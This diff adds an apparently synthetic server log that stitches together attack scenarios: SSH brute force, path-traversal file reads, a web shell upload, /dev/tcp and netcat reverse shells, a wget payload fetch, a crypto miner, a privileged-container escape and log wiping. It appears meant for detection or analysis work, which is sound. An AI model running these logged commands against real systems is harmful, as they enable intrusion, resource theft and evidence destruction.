@@ -1,0 +1,195 @@
+Feb 15 13:55:01 webserver sshd[5021]: Accepted password for www-data from 203.0.113.190 port 57111 ssh2
+Feb 15 13:55:01 webserver sshd[5021]: pam_unix(sshd:session): session opened for user www-data by (uid=0)
+
+Feb 15 13:55:10 webserver CRON[5030]: (www-data) CMD (echo '* * * * * /tmp/.update.sh' >> /var/spool/cron/crontabs/www-data)
+Feb 15 13:55:11 webserver audit[5032]: SYSCALL arch=c000003e syscall=2 success=yes exit=3 a0="/var/spool/cron/crontabs/www-data" a1=O_WRONLY|O_APPEND a2=0600
+Feb 15 13:55:11 webserver audit[5032]: PATH item=0 name="/var/spool/cron/crontabs/www-data" inode=492001 dev=08:01 mode=0100600 ouid=33 ogid=33
+
+Feb 15 13:56:01 webserver CRON[5045]: (www-data) CMD (/tmp/.update.sh)
+Feb 15 13:56:01 webserver audit[5046]: EXECVE argc=2 a0="/bin/bash" a1="/tmp/.update.sh"
+Feb 15 13:56:01 webserver audit[5046]: SYSCALL arch=c000003e syscall=59 success=yes exit=0 a0=55b8c2f0 a1=55b8c310 a2=55b8c330 comm="bash" exe="/usr/bin/bash"
+
+Feb 15 13:56:02 webserver kernel: [UFW ALLOW] OUT=eth0 SRC=192.168.1.20 DST=185.203.116.55 LEN=60 TOS=0x00 TTL=64 ID=72001 PROTO=TCP SPT=41221 DPT=8080
+Feb 15 13:56:03 webserver syslog: bash[5046]: wget http://185.203.116.55/payload.sh -O /tmp/payload.sh
+
+Feb 15 13:57:01 webserver CRON[5060]: (www-data) CMD (/tmp/.update.sh)
+Feb 15 13:57:01 webserver audit[5061]: EXECVE argc=2 a0="/bin/bash" a1="/tmp/.update.sh"
+
+Feb 15 13:58:01 webserver CRON[5075]: (www-data) CMD (/tmp/.update.sh)
+Feb 15 13:58:01 webserver audit[5076]: EXECVE argc=2 a0="/bin/bash" a1="/tmp/.update.sh"
+
+Feb 15 13:59:00 webserver sshd[5021]: pam_unix(sshd:session): session closed for user www-data
+Feb 15 19:50:01 webserver sshd[10021]: Accepted password for ubuntu from 203.0.113.88 port 61111 ssh2
+Feb 15 19:50:01 webserver sshd[10021]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+
+Feb 15 19:50:10 webserver syslog: ubuntu executed file /tmp/kdevtmpfsi
+Feb 15 19:50:10 webserver audit[10040]: EXECVE argc=1 a0="/tmp/kdevtmpfsi"
+Feb 15 19:50:10 webserver audit[10040]: SYSCALL arch=c000003e syscall=59 success=yes exit=0 comm="kdevtmpfsi" exe="/tmp/kdevtmpfsi"
+
+Feb 15 19:50:12 webserver kernel: kdevtmpfsi[10040]: ELF binary running from /tmp directory
+Feb 15 19:50:15 webserver syslog: kdevtmpfsi[10040]: downloading xmrig miner binary
+Feb 15 19:50:16 webserver audit[10045]: EXECVE argc=3 a0="/usr/bin/wget" a1="http://185.203.116.200/xmrig" a2="-O /tmp/.xmrig"
+
+Feb 15 19:50:20 webserver audit[10050]: EXECVE argc=2 a0="/bin/chmod" a1="+x /tmp/.xmrig"
+Feb 15 19:50:21 webserver audit[10051]: EXECVE argc=2 a0="/tmp/.xmrig" a1="--donate-level=1 --url pool.minexmr.com:3333"
+
+Feb 15 19:50:22 webserver syslog: xmrig[10051]: CPU usage 98%
+Feb 15 19:50:23 webserver syslog: xmrig[10051]: connected to pool.minexmr.com:3333 (TLS enabled)
+
+Feb 15 19:50:25 webserver CRON[10060]: (ubuntu) CMD (*/5 * * * * /tmp/.xmrig --donate-level=1)
+Feb 15 19:50:26 webserver audit[10061]: PATH item=0 name="/var/spool/cron/crontabs/ubuntu" inode=55001 dev=08:01 mode=0100600 ouid=1000 ogid=1000
+
+Feb 15 19:50:30 webserver kernel: [UFW ALLOW] OUT=eth0 SRC=192.168.1.20 DST=45.76.23.199 LEN=60 TOS=0x00 TTL=64 ID=76001 PROTO=TCP SPT=43221 DPT=3333
+Feb 15 19:50:31 webserver kernel: [UFW ALLOW] OUT=eth0 SRC=192.168.1.20 DST=45.76.23.199 LEN=60 TOS=0x00 TTL=64 ID=76002 PROTO=TCP SPT=43222 DPT=3333
+
+Feb 15 19:51:01 webserver CRON[10075]: (ubuntu) CMD (/tmp/.xmrig --donate-level=1)
+Feb 15 19:51:02 webserver syslog: xmrig[10080]: mining job started (algo=RandomX)
+
+Feb 15 19:52:00 webserver sshd[10021]: pam_unix(sshd:session): session closed for user ubuntu
+Feb 15 16:30:01 dockerhost dockerd[7101]: container start 9f3c2ab4e1c2 (image=ubuntu:latest, privileged=true)
+Feb 15 16:30:02 dockerhost dockerd[7101]: container 9f3c2ab4e1c2 mounted volume /:/host (rw)
+
+Feb 15 16:30:05 dockerhost audit[7120]: EXECVE argc=3 a0="/bin/bash" a1="-c" a2="chroot /host /bin/bash"
+Feb 15 16:30:05 dockerhost audit[7120]: SYSCALL arch=c000003e syscall=59 success=yes exit=0 auid=0 uid=0 gid=0 comm="bash" exe="/usr/bin/bash"
+
+Feb 15 16:30:07 dockerhost syslog: bash[7120]: chroot executed to /host
+Feb 15 16:30:08 dockerhost audit[7122]: PATH item=0 name="/host/etc/shadow" inode=40122 dev=08:01 mode=0100640 ouid=0 ogid=42
+
+Feb 15 16:30:10 dockerhost kernel: overlayfs: attempt to access host filesystem from container 9f3c2ab4e1c2
+Feb 15 16:30:11 dockerhost audit[7125]: EXECVE argc=2 a0="/bin/cat" a1="/host/etc/shadow"
+
+Feb 15 16:30:15 dockerhost dockerd[7101]: warning: container 9f3c2ab4e1c2 running with --privileged flag
+Feb 15 16:30:16 dockerhost dockerd[7101]: security alert: potential container breakout detected (PID namespace escape)
+
+Feb 15 16:30:20 dockerhost audit[7130]: EXECVE argc=2 a0="/usr/bin/nsenter" a1="--target 1 --mount --uts --ipc --net --pid"
+Feb 15 16:30:21 dockerhost syslog: nsenter[7130]: entered host namespaces successfully
+
+Feb 15 16:30:25 dockerhost dockerd[7101]: container stop 9f3c2ab4e1c2 (exitCode=0)
+Feb 15 17:45:01 webserver apache2: 203.0.113.220 - - [15/Feb/2026:17:45:01 +0000] "GET /index.php?page=../../../../etc/passwd HTTP/1.1" 200 1320 "-" "Mozilla/5.0"
+Feb 15 17:45:02 webserver apache2: 203.0.113.220 - - [15/Feb/2026:17:45:02 +0000] "GET /index.php?page=../../../../etc/shadow HTTP/1.1" 500 620 "-" "Mozilla/5.0"
+Feb 15 17:45:03 webserver apache2: 203.0.113.220 - - [15/Feb/2026:17:45:03 +0000] "GET /index.php?page=/proc/self/environ HTTP/1.1" 200 890 "-" "Mozilla/5.0"
+Feb 15 17:45:04 webserver apache2: 203.0.113.220 - - [15/Feb/2026:17:45:04 +0000] "GET /index.php?page=php://filter/convert.base64-encode/resource=config.php HTTP/1.1" 200 1024 "-" "Mozilla/5.0"
+
+Feb 15 17:45:05 webserver apache2: 203.0.113.220 - - [15/Feb/2026:17:45:05 +0000] "GET /index.php?page=../../../../var/log/auth.log HTTP/1.1" 200 1450 "-" "Mozilla/5.0"
+
+Feb 15 17:45:06 webserver apache2: 203.0.113.220 - - [15/Feb/2026:17:45:06 +0000] "GET /index.php?page=../../../../etc/hosts HTTP/1.1" 200 420 "-" "Mozilla/5.0"
+
+Feb 15 17:45:07 webserver apache2: 203.0.113.220 - - [15/Feb/2026:17:45:07 +0000] "GET /index.php?page=../../../../home/john/.bash_history HTTP/1.1" 200 760 "-" "Mozilla/5.0"
+
+Feb 15 17:45:08 webserver audit[8120]: SYSCALL arch=c000003e syscall=2 success=yes exit=3 a0="/etc/passwd" a1=O_RDONLY a2=0
+Feb 15 17:45:08 webserver audit[8120]: PATH item=0 name="/etc/passwd" inode=30122 dev=08:01 mode=0100644 ouid=0 ogid=0
+
+Feb 15 17:45:09 webserver apache2: PHP Warning:  include(../../../../etc/shadow): failed to open stream: Permission denied in /var/www/html/index.php on line 12
+Feb 15 17:45:10 webserver apache2: PHP Warning:  include(): Failed opening '../../../../etc/shadow' for inclusion in /var/www/html/index.php on line 12
+
+Feb 15 17:45:11 webserver kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.220 DST=192.168.1.20 LEN=60 TOS=0x00 TTL=50 ID=74001 PROTO=TCP SPT=60321 DPT=80
+Feb 15 18:30:01 webserver sshd[9021]: Accepted password for john from 203.0.113.250 port 60111 ssh2
+Feb 15 18:30:01 webserver sshd[9021]: pam_unix(sshd:session): session opened for user john by (uid=0)
+
+Feb 15 18:30:10 webserver sudo:    john : TTY=pts/0 ; PWD=/home/john ; USER=root ; COMMAND=/bin/bash
+Feb 15 18:30:10 webserver sudo: pam_unix(sudo:session): session opened for user root by john(uid=1001)
+
+Feb 15 18:30:20 webserver audit[9050]: EXECVE argc=3 a0="/bin/rm" a1="-f" a2="/var/log/auth.log"
+Feb 15 18:30:20 webserver audit[9050]: PATH item=0 name="/var/log/auth.log" inode=22011 dev=08:01 mode=0100640 ouid=0 ogid=4
+Feb 15 18:30:20 webserver audit[9050]: SYSCALL arch=c000003e syscall=87 success=yes exit=0 comm="rm" exe="/usr/bin/rm"
+
+Feb 15 18:30:25 webserver audit[9055]: EXECVE argc=3 a0="/usr/bin/truncate" a1="-s" a2="0 /var/log/syslog"
+Feb 15 18:30:25 webserver audit[9055]: PATH item=0 name="/var/log/syslog" inode=22012 dev=08:01 mode=0100644 ouid=0 ogid=4
+
+Feb 15 18:30:30 webserver syslog: root executed command: history -c
+Feb 15 18:30:31 webserver audit[9060]: EXECVE argc=2 a0="/bin/bash" a1="-c history -c"
+
+Feb 15 18:30:35 webserver audit[9065]: EXECVE argc=2 a0="/usr/bin/shred" a1="-u /var/log/auth.log"
+Feb 15 18:30:35 webserver audit[9065]: SYSCALL arch=c000003e syscall=87 success=yes exit=0 comm="shred" exe="/usr/bin/shred"
+
+Feb 15 18:30:40 webserver syslog: rsyslogd: log file /var/log/auth.log rotated
+Feb 15 18:30:45 webserver sshd[9021]: pam_unix(sshd:session): session closed for user john
+Feb 15 15:10:01 webserver sshd[6101]: Accepted password for john from 203.0.113.210 port 58111 ssh2
+Feb 15 15:10:01 webserver sshd[6101]: pam_unix(sshd:session): session opened for user john by (uid=0)
+
+Feb 15 15:10:10 webserver syslog: john executed file /tmp/install.bin
+Feb 15 15:10:10 webserver audit[6120]: EXECVE argc=1 a0="/tmp/install.bin"
+Feb 15 15:10:10 webserver audit[6120]: SYSCALL arch=c000003e syscall=59 success=yes exit=0 a0=55b8c2f0 a1=55b8c310 a2=55b8c330 comm="install.bin" exe="/tmp/install.bin"
+
+Feb 15 15:10:11 webserver kernel: install.bin[6120]: ELF binary detected in /tmp directory
+Feb 15 15:10:12 webserver audit[6121]: PATH item=0 name="/tmp/install.bin" inode=502110 dev=08:01 mode=0100755 ouid=1001 ogid=1001
+
+Feb 15 15:10:15 webserver kernel: [UFW ALLOW] OUT=eth0 SRC=192.168.1.20 DST=185.203.116.77 LEN=60 TOS=0x00 TTL=64 ID=73001 PROTO=TCP SPT=42221 DPT=4444
+Feb 15 15:10:16 webserver syslog: install.bin[6120]: connecting to 185.203.116.77:4444
+
+Feb 15 15:10:20 webserver audit[6125]: EXECVE argc=2 a0="/bin/chmod" a1="+x /tmp/.xmr"
+Feb 15 15:10:21 webserver audit[6126]: EXECVE argc=2 a0="/tmp/.xmr" a1="--donate-level=1"
+
+Feb 15 15:10:22 webserver kernel: xmrig[6130]: CPU usage spike detected (95%)
+Feb 15 15:10:23 webserver syslog: xmrig[6130]: connected to pool.minexmr.com:3333
+
+Feb 15 15:10:30 webserver audit[6135]: SYSCALL arch=c000003e syscall=2 success=yes exit=3 a0="/etc/ld.so.preload" a1=O_WRONLY|O_CREAT a2=0644
+Feb 15 15:10:35 webserver sshd[6101]: pam_unix(sshd:session): session closed for user john
+Feb 15 10:05:01 webserver sshd[3221]: Accepted password for john from 203.0.113.160 port 56111 ssh2
+Feb 15 10:05:01 webserver sshd[3221]: pam_unix(sshd:session): session opened for user john by (uid=0)
+
+Feb 15 10:05:10 webserver sudo:    john : TTY=pts/0 ; PWD=/home/john ; USER=root ; COMMAND=/bin/bash
+Feb 15 10:05:10 webserver sudo: pam_unix(sudo:session): session opened for user root by john(uid=1001)
+
+Feb 15 10:05:15 webserver sudo:    john : TTY=pts/0 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/id
+Feb 15 10:05:20 webserver sudo:    john : TTY=pts/0 ; PWD=/home/john ; USER=root ; COMMAND=/bin/cat /etc/shadow
+
+Feb 15 10:05:25 webserver audit[3250]: USER_CMD pid=3250 uid=0 auid=1001 ses=3 msg='cwd="/root" cmd="/bin/bash" exe="/usr/bin/sudo"'
+Feb 15 10:05:30 webserver audit[3252]: USER_ACCT pid=3252 uid=0 auid=1001 msg='op=PAM:setcred acct="root" exe="/usr/bin/sudo"'
+
+Feb 15 10:05:35 webserver sudo:    john : user NOT in sudoers ; TTY=pts/1 ; PWD=/home/john ; USER=root ; COMMAND=/bin/bash
+
+Feb 15 10:05:40 webserver sudo:    john : TTY=pts/0 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/vim /etc/sudoers
+Feb 15 10:05:40 webserver sudo: pam_unix(sudo:session): session closed for user root
+
+Feb 15 10:05:50 webserver sshd[3221]: pam_unix(sshd:session): session closed for user john
+Feb 15 11:20:01 webserver apache2: 203.0.113.170 - - [15/Feb/2026:11:20:01 +0000] "GET /upload.php?cmd=bash -i >& /dev/tcp/203.0.113.200/4444 0>&1 HTTP/1.1" 200 512 "-" "Mozilla/5.0"
+Feb 15 11:20:02 webserver apache2: 203.0.113.170 - - [15/Feb/2026:11:20:02 +0000] "GET /shell.php?cmd=nc -e /bin/bash 203.0.113.200 4444 HTTP/1.1" 200 498 "-" "curl/7.68.0"
+
+Feb 15 11:20:03 webserver kernel: [12345.678901] audit: type=EXECVE msg=audit(1707996003.123:421): argc=3 a0="/bin/bash" a1="-c" a2="bash -i >& /dev/tcp/203.0.113.200/4444 0>&1"
+Feb 15 11:20:03 webserver kernel: [12345.678905] audit: type=SYSCALL msg=audit(1707996003.123:421): arch=c000003e syscall=59 success=yes exit=0 a0=55b8c2f0 a1=55b8c310 a2=55b8c330 items=2 ppid=2145 pid=3261 auid=33 uid=33 gid=33 euid=33 tty=(none) ses=5 comm="bash" exe="/usr/bin/bash"
+
+Feb 15 11:20:04 webserver kernel: [12346.123456] audit: type=SOCKADDR msg=audit(1707996004.456:422): saddr=0200115cCB0071C8
+Feb 15 11:20:04 webserver kernel: [12346.123460] audit: type=SYSCALL msg=audit(1707996004.456:422): arch=c000003e syscall=42 success=yes exit=0 a0=3 a1=7ffc12345678 a2=16 comm="bash" exe="/usr/bin/bash"
+
+Feb 15 11:20:05 webserver kernel: [UFW ALLOW] OUT=eth0 SRC=192.168.1.20 DST=203.0.113.200 LEN=60 TOS=0x00 TTL=64 ID=70001 PROTO=TCP SPT=39822 DPT=4444
+Feb 15 11:20:06 webserver kernel: [UFW ALLOW] OUT=eth0 SRC=192.168.1.20 DST=203.0.113.200 LEN=60 TOS=0x00 TTL=64 ID=70002 PROTO=TCP SPT=39823 DPT=4444
+
+Feb 15 11:20:07 webserver syslog: bash[3261]: connect to 203.0.113.200 port 4444
+Feb 15 11:20:08 webserver syslog: bash[3261]: session established with remote host
+
+Feb 15 11:20:10 webserver sshd[3300]: Accepted password for www-data from 127.0.0.1 port 60222 ssh2
+Feb 15 11:20:10 webserver sshd[3300]: pam_unix(sshd:session): session opened for user www-data by (uid=0)
+Feb 15 09:10:01 webserver sshd[2145]: Failed password for invalid user admin from 203.0.113.150 port 55221 ssh2
+Feb 15 09:10:03 webserver sshd[2145]: Failed password for invalid user test from 203.0.113.150 port 55222 ssh2
+Feb 15 09:10:05 webserver sshd[2145]: Failed password for invalid user guest from 203.0.113.150 port 55223 ssh2
+Feb 15 09:10:07 webserver sshd[2145]: Failed password for root from 203.0.113.150 port 55224 ssh2
+Feb 15 09:10:09 webserver sshd[2145]: Failed password for root from 203.0.113.150 port 55225 ssh2
+Feb 15 09:10:11 webserver sshd[2145]: Failed password for root from 203.0.113.150 port 55226 ssh2
+Feb 15 09:10:13 webserver sshd[2145]: Failed password for root from 203.0.113.150 port 55227 ssh2
+Feb 15 09:10:15 webserver sshd[2145]: error: maximum authentication attempts exceeded for root from 203.0.113.150 port 55227 ssh2 [preauth]
+Feb 15 09:10:17 webserver sshd[2145]: Received disconnect from 203.0.113.150 port 55227:11: Bye Bye [preauth]
+Feb 15 09:10:20 webserver sshd[2150]: Accepted password for root from 203.0.113.150 port 55230 ssh2
+Feb 15 09:10:20 webserver sshd[2150]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Feb 15 09:10:22 webserver sshd[2150]: pam_unix(sshd:session): session closed for user root
+
+Feb 15 09:10:25 webserver sshd[2155]: Failed password for invalid user oracle from 203.0.113.150 port 55231 ssh2
+Feb 15 09:10:27 webserver sshd[2155]: Failed password for invalid user postgres from 203.0.113.150 port 55232 ssh2
+Feb 15 09:10:29 webserver sshd[2155]: Failed password for invalid user ubuntu from 203.0.113.150 port 55233 ssh2
+Feb 15 09:10:31 webserver sshd[2155]: Connection closed by authenticating user root 203.0.113.150 port 55234 [preauth]
+Feb 15 12:40:01 webserver apache2: 203.0.113.180 - - [15/Feb/2026:12:40:01 +0000] "POST /upload.php HTTP/1.1" 200 742 "-" "Mozilla/5.0"
+Feb 15 12:40:01 webserver apache2: 203.0.113.180 - - [15/Feb/2026:12:40:01 +0000] "POST /upload.php HTTP/1.1" 200 742 "-" "Content-Disposition: form-data; name="file"; filename="shell.php""
+
+Feb 15 12:40:02 webserver audit[4123]: SYSCALL arch=c000003e syscall=2 success=yes exit=3 a0="/var/www/html/uploads/shell.php" a1=O_WRONLY|O_CREAT a2=0644
+Feb 15 12:40:02 webserver audit[4123]: PATH item=0 name="/var/www/html/uploads/shell.php" inode=393482 dev=08:01 mode=0100644 ouid=33 ogid=33
+
+Feb 15 12:40:05 webserver apache2: 203.0.113.180 - - [15/Feb/2026:12:40:05 +0000] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 124 "-" "curl/7.68.0"
+Feb 15 12:40:06 webserver apache2: 203.0.113.180 - - [15/Feb/2026:12:40:06 +0000] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 132 "-" "curl/7.68.0"
+Feb 15 12:40:07 webserver apache2: 203.0.113.180 - - [15/Feb/2026:12:40:07 +0000] "GET /uploads/shell.php?cmd=uname -a HTTP/1.1" 200 256 "-" "curl/7.68.0"
+
+Feb 15 12:40:08 webserver kernel: [12355.778901] audit: type=EXECVE msg=audit(1708000808.321:511): argc=3 a0="/bin/sh" a1="-c" a2="whoami"
+Feb 15 12:40:08 webserver kernel: [12355.778905] audit: type=EXECVE msg=audit(1708000808.322:512): argc=3 a0="/bin/sh" a1="-c" a2="id"
+
+Feb 15 12:40:10 webserver apache2: 203.0.113.180 - - [15/Feb/2026:12:40:10 +0000] "GET /uploads/shell.php?cmd=nc -e /bin/bash 203.0.113.200 4444 HTTP/1.1" 200 310 "-" "curl/7.68.0"
+
+Feb 15 12:40:12 webserver kernel: [UFW ALLOW] OUT=eth0 SRC=192.168.1.20 DST=203.0.113.200 LEN=60 TOS=0x00 TTL=64 ID=71001 PROTO=TCP SPT=40222 DPT=4444
